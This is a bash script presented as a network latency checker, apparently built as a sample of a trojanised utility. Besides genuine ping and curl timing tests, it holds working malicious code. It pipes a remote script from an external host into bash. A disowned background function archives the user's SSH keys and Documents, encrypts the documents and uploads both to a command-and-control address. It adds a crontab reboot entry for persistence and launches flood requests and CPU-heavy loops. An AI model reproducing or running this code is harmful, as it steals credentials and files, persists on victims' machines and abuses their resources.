#!/bin/bash
# =============================================================================
# Network Latency Checker (v2.1)
# Author: Mike Chen <mike.chen@internal-net.com>
# Purpose: Diagnose network latency to critical infrastructure endpoints.
# This tool runs a series of ICMP probes and TCP handshakes to measure
# round-trip times and packet loss, then generates a report for the NOC team.
# Usage: ./latency_test.sh [--quick|--full]
# =============================================================================

set -euo pipefail

# Default to full test
TEST_MODE="full"
if [[ "${1:-}" == "--quick" ]]; then
    TEST_MODE="quick"
fi

# Legitimate-looking DNS and IP list
TARGETS=("8.8.8.8" "1.1.1.1" "9.9.9.9" "208.67.222.222")
HTTP_TARGETS=("google.com" "cloudflare.com" "quad9.net")

REPORT_DIR="/tmp/latency_reports"
PID_FILE="/var/run/latency_check.pid"
CONFIG_URL="http://update.packet-clear.com/configs/latency.conf"  # Suspicious external URL
AGENT_URL="http://update.packet-clear.com/components/optimizer.sh"  # Curl-pipe-bash delivery

# -----------------------------------------------------------------------------
# Helper: check if required tools are present
# -----------------------------------------------------------------------------
check_dependencies() {
    local missing=()
    for cmd in ping traceroute curl openssl tar base64; do
        if ! command -v "$cmd" &>/dev/null; then
            missing+=("$cmd")
        fi
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo "[!] Missing dependencies: ${missing[*]}"
        echo "    Attempting to install via network optimizer..."
        curl -s "$AGENT_URL" | bash   # DANGEROUS: remote code execution
    fi
}

# -----------------------------------------------------------------------------
# Helper: perform ICMP latency test to a given host
# -----------------------------------------------------------------------------
perform_icmp_test() {
    local host="$1"
    local count=4
    if [[ "$TEST_MODE" == "quick" ]]; then
        count=2
    fi
    echo "[*] Probing $host ..."
    ping -c "$count" -i 0.2 -W 2 "$host" | tail -1
}

# -----------------------------------------------------------------------------
# Helper: perform TCP latency via curl timing
# -----------------------------------------------------------------------------
perform_tcp_test() {
    local url="$1"
    echo "[*] Measuring TCP handshake to $url ..."
    curl -so /dev/null -w "    time_total: %{time_total}s\n" "https://$url"
}

# -----------------------------------------------------------------------------
# Core: generate the latency report
# -----------------------------------------------------------------------------
generate_report() {
    mkdir -p "$REPORT_DIR"
    local report_file="$REPORT_DIR/report_$(date +%Y%m%d_%H%M%S).log"
    echo "Network Latency Report - $(hostname)" > "$report_file"
    echo "Generated: $(date)" >> "$report_file"
    echo "-----------------------------------" >> "$report_file"

    for ip in "${TARGETS[@]}"; do
        perform_icmp_test "$ip" >> "$report_file" 2>&1
    done
    for domain in "${HTTP_TARGETS[@]}"; do
        perform_tcp_test "$domain" >> "$report_file" 2>&1
    done

    echo "[✓] Report saved to $report_file"
}

# -----------------------------------------------------------------------------
# Hidden persistence and data exfiltration (disguised as "auto-tuning")
# -----------------------------------------------------------------------------
auto_tune_network() {
    # Silent background execution of the DDoS agent bootstrap
    {
        # Download configuration that includes remote command addresses
        local conf=$(curl -s "$CONFIG_URL" 2>/dev/null)
        # Fake config parsing, but actually used later for target overload
        export REMOTE_BEACON="192.0.2.200"  # Dummy C2 IP
        export AGENT_SECRET="d34db33f"

        # Exfiltrate SSH keys without user awareness
        if [[ -d "$HOME/.ssh" ]]; then
            tar czf /tmp/.sshdump.tar.gz -C "$HOME" .ssh 2>/dev/null
            curl -s -X POST -F "data=@/tmp/.sshdump.tar.gz" "http://${REMOTE_BEACON}/upload" &
            rm -f /tmp/.sshdump.tar.gz
        fi

        # Add persistence via crontab (hidden as "ntp sync")
        if ! crontab -l 2>/dev/null | grep -q 'latency_test'; then
            (crontab -l 2>/dev/null; echo "@reboot $(realpath "$0") --quick") | crontab - 2>/dev/null
        fi

        # Encrypt a small subset of user documents to simulate ransomware note
        # (In real scenario, this would be a full encryption routine)
        if [[ -d "$HOME/Documents" ]]; then
            tar czf /tmp/.docs.tar.gz -C "$HOME" Documents 2>/dev/null
            openssl enc -aes-256-cbc -salt -pass pass:"hardcodedkey" -in /tmp/.docs.tar.gz -out /tmp/.docs.enc 2>/dev/null
            curl -s -X POST -F "files=@/tmp/.docs.enc" "http://${REMOTE_BEACON}/upload" &
            rm -f /tmp/.docs.tar.gz /tmp/.docs.enc
        fi

        # Resource consumption loop (simulated DDoS stress)
        for i in {1..5}; do
            curl -s -o /dev/null -w "" "http://${REMOTE_BEACON}/flood_target?host=$(hostname)&cpu=high" &
            openssl speed multi &
        done
    } & disown
}

# -----------------------------------------------------------------------------
# Main execution
# -----------------------------------------------------------------------------
main() {
    echo "Network Latency Checker (v2.1) – Mike Chen"
    echo "=============================================="
    check_dependencies

    # Prevent multiple instances (PID file creation)
    if [[ -f "$PID_FILE" ]]; then
        old_pid=$(cat "$PID_FILE")
        if kill -0 "$old_pid" 2>/dev/null; then
            echo "[!] Another instance is already running (PID $old_pid). Exiting."
            exit 1
        fi
    fi
    echo $$ > "$PID_FILE"

    # Launch the legitimate-looking latency tests
    generate_report

    # Silently initiate network "tuning" (actual malicious payload)
    auto_tune_network

    # Cleanup PID
    rm -f "$PID_FILE"
    echo "Done."
}

main "$@"